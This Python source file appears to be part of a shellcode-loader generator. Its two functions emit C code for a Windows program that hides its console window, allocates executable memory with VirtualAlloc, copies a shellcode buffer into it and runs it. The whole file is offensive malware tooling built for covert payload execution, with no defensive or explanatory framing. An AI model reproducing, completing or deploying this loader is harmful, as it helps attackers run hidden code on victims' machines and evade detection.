import random

def Start():

    Start_Code = "#include <windows.h>\n"
    Start_Code += "#include <stdio.h>\n"
    Start_Code += "#include <stdlib.h>\n"
    Start_Code += "int main(int argc, char **argv) {\n"

    return Start_Code



def End():

    End_Code = "};\nHWND hWnd = GetConsoleWindow();\n"
    End_Code += "ShowWindow(hWnd, SW_HIDE);\n"
    End_Code += "void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
    End_Code += "memcpy(exec, shellcode, sizeof shellcode);\n"
    End_Code += "((void(*)())exec)();\n}\n"

    return End_Code